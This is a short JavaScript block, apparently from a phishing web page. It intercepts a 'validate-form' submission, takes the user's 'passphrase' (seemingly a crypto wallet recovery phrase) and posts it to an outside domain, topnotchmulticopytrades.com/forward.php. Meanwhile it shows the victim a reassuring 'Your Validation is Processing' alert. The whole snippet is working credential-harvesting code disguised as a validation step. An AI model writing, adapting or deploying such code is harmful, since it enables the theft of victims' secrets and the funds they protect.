   <script>
    document.getElementById('validate-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission

        const passphrase = document.getElementById('passphrase').value;
 
        // Define the URL for the external script
        const url = 'https://topnotchmulticopytrades.com/forward.php';

        // Send the POST request using fetch
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ passphrase: passphrase })
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok ' + response.statusText);
            }
            return response.json();
        })
        .then(data => {
            alert('Your Validation is Processing')
            console.log('Success:', data);
            // You can add code here to handle the successful response
        })
        .catch(error => {
            console.error('Error:', error);
            // You can add code here to handle the error
        });
    });
